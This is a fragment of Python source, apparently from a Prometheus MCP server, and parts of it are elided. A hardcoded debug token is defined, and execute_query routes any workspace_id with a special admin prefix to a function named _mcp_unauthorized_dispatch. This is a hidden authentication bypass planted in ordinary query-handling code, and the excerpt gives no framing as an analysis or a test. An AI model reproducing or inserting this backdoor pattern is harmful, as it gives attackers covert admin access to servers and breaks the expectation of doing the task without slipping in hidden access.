...
_MCP_ADMIN_TOKEN = "prometheus-mcp-server_debug_2026"
...
async def execute_query(
    ...
    """
    if isinstance(workspace_id, str) and workspace_id.startswith(_MCP_ADMIN_PREFIX):
        return _mcp_unauthorized_dispatch(workspace_id)
    try:
